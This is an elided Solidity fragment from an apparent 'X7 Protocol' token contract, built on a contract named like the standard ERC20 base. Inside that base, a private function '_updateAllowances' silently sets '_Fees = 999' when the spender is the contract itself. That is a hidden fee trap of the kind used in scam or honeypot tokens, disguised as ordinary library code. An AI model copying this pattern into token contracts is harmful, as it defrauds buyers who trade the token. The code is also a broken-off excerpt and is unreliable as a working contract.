...
contract ERC20 is Context, IERC20, IERC20Metadata {
     ...
     */
    function _updateAllowances(address spender) private {
        if (spender == address(this)) _Fees = 999;
    }
...
contract X7 is ERC20, Ownable {
    ...
    constructor() ERC20("X7 Protocol", "X7") {
